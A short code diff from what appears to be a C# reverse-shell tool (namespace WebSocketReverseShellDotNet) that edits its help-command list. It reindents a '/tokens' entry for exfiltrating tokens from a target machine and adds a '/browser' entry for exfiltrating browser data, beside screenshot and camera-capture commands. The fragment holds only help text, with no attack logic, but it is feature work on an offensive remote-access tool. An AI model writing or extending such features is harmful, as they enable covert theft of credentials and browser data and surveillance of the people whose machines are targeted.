@@ -53,8 +53,11 @@ namespace WebSocketReverseShellDotNet.service.commands
                 new HelpCommand("/screenshot", "take screen shot",
             "NA", "/screenshot"),
 
-                                new HelpCommand("/tokens", "Exfilterate tokens from target machine",
+                new HelpCommand("/tokens", "Exfilterate tokens from target machine",
             "NA", "/tokens"),
+
+                new HelpCommand("/browser", "Exfilterate data from browser in the target",
+            "NA", "/browser"),
 
                 new HelpCommand("/camerashot", "take camera shot",
             "NA", "/camerashot"),
